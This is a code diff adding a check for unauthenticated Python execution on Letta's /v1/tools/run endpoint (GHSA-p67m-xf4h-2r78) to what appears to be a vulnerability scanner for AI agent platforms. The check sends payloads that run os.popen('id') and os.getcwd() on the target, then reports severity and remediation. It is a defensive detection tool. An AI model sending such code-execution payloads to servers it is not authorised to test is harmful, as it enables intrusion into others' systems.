@@ -57,6 +57,20 @@ _LANGFLOW_CMD_PROBE = {
     "frontend_node": {},
 }
 
+# Letta — POST /v1/tools/run — Python exec without auth (GHSA-p67m-xf4h-2r78)
+# Root cause: CheckPasswordMiddleware only activates with LETTA_SERVER_SECURE=true (opt-in)
+_LETTA_TOOLS_RUN_ENDPOINT = "/v1/tools/run"
+_LETTA_RUN_CMD_PAYLOAD = {
+    "source_code": "import os\ndef _condor_probe_():\n    return os.popen('id').read()",
+    "name": "_condor_probe_",
+    "args": {},
+}
+_LETTA_RUN_PATH_PAYLOAD = {
+    "source_code": "import os\ndef _condor_probe_():\n    return os.getcwd()",
+    "name": "_condor_probe_",
+    "args": {},
+}
+
 # Open WebUI — Python function creation (filter/action type, executed on chat events)
 _OWI_FUNCTION_ENDPOINT = "/api/v1/functions"
 _OWI_FUNCTION_PAYLOAD  = {
@@ -70,6 +84,71 @@ class CodeExecutionModule(BaseModule):
     name        = "code-execution"
     owasp_id    = OWASPCategory.ASI05
     description = "Detects eval/exec sinks and unauthenticated code execution endpoints (ASI05)"
+
+    async def _check_letta_tools_run(self, platform: BasePlatform) -> list[Finding]:
+        """Probe Letta /v1/tools/run — arbitrary Python execution without auth (GHSA-p67m-xf4h-2r78)."""
+        findings: list[Finding] = []
+        try:
+            r = await platform.post(_LETTA_TOOLS_RUN_ENDPOINT, json=_LETTA_RUN_CMD_PAYLOAD)
+            if r.status_code in (401, 403):
+                return findings
+            if not _is_api_response(r):
+                return findings
+            if r.status_code == 200:
+                body = r.text
+                if any(ind in body for ind in _CMD_INDICATORS):
+                    findings.append(Finding(
+                        title="Remote code execution confirmed via /v1/tools/run (Letta)",
+                        severity=Severity.CRITICAL,
+                        owasp_id=self.owasp_id,
+                        description=(
+                            "Letta's /v1/tools/run endpoint executes arbitrary Python source code "
+                            "without authentication. CheckPasswordMiddleware is only active when "
+                            "LETTA_SERVER_SECURE=true is set; the default installation is fully open. "
+                            "An unauthenticated attacker achieves full server-side code execution."
+                        ),
+                        evidence=f"POST {_LETTA_TOOLS_RUN_ENDPOINT} with os.popen('id') → 200, command output: {body[:200]}",
+                        remediation=(
+                            "Set LETTA_SERVER_SECURE=true in the Letta environment. "
+                            "Note: LETTA_SERVER_PASS alone has no effect without this flag."
+                        ),
+                        confidence=98,
+                        cwe_id="CWE-94",
+                        endpoint=_LETTA_TOOLS_RUN_ENDPOINT,
+                    ))
+                    return findings
+
+                # Fallback: confirm execution via os.getcwd()
+                r2 = await platform.post(_LETTA_TOOLS_RUN_ENDPOINT, json=_LETTA_RUN_PATH_PAYLOAD)
+                if r2.status_code in (401, 403):
+                    return findings
+                if r2.status_code == 200 and _is_api_response(r2):
+                    body2 = r2.text
+                    path_confirmed = any(ind in body2 for ind in _PATH_INDICATORS)
+                    findings.append(Finding(
+                        title="Unauthenticated Python execution via /v1/tools/run (Letta)",
+                        severity=Severity.CRITICAL,
+                        owasp_id=self.owasp_id,
+                        description=(
+                            "Letta's /v1/tools/run endpoint accepted Python source code without "
+                            "authentication. The default configuration does not enforce auth — "
+                            "LETTA_SERVER_SECURE=true must be explicitly set."
+                        ),
+                        evidence=(
+                            f"POST {_LETTA_TOOLS_RUN_ENDPOINT} → 200 OK"
+                            + (f", path reflected: {body2[:200]}" if path_confirmed else ", code accepted without auth")
+                        ),
+                        remediation=(
+                            "Set LETTA_SERVER_SECURE=true in the Letta environment. "
+                            "Note: LETTA_SERVER_PASS alone has no effect without this flag."
+                        ),
+                        confidence=90 if path_confirmed else 80,
+                        cwe_id="CWE-94",
+                        endpoint=_LETTA_TOOLS_RUN_ENDPOINT,
+                    ))
+        except Exception:
+            pass
+        return findings
 
     async def _check_owui_functions(self, platform: BasePlatform) -> list[Finding]:
         """Probe Open WebUI function creation endpoint — Python filter/action execution without auth."""
@@ -319,6 +398,9 @@ class CodeExecutionModule(BaseModule):
                     ))
             except Exception:
                 pass
+
+        # Letta: /v1/tools/run — Python exec without auth
+        findings.extend(await self._check_letta_tools_run(platform))
 
         # Open WebUI: Python function creation endpoint
         findings.extend(await self._check_owui_functions(platform))
